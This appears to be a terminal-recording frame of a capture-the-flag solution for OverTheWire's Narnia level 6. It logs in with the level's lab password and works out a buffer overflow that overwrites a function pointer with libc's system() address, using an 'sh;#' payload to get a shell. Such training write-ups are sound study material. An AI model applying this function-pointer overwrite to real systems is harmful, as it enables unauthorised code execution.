[0.002, "o", "$ ssh narnia6@narnia.labs.overthewire.org -p 2226   # password uK3ikaZLxB\r\n$ cat /narnia/narnia6.c   # char b1[8], b2[8]; fp = &puts; strcpy(b1,argv[1]); fp(b1)\r\n$ objdump: b1 at ebp-0x14, b2 at ebp-0x1c, fp at ebp-0xc -> b1+8 == fp\r\n$ get_sp() returns esp & 0xff000000; the guard rejects a stack pointer\r\n$ ldd: libc32 base 0xf7d6d000; nm -D: system offset 0x53ce0 -> 0xf7dc0ce0\r\n$ b1 = \"sh;#AAAA\" + <system addr>; system(\"sh;#<addr bytes>\") -> # hides them\r\n$ b2 must be short: b2[8] is b1[0], a long b2 NULs b1 via strcpy\r\n"]
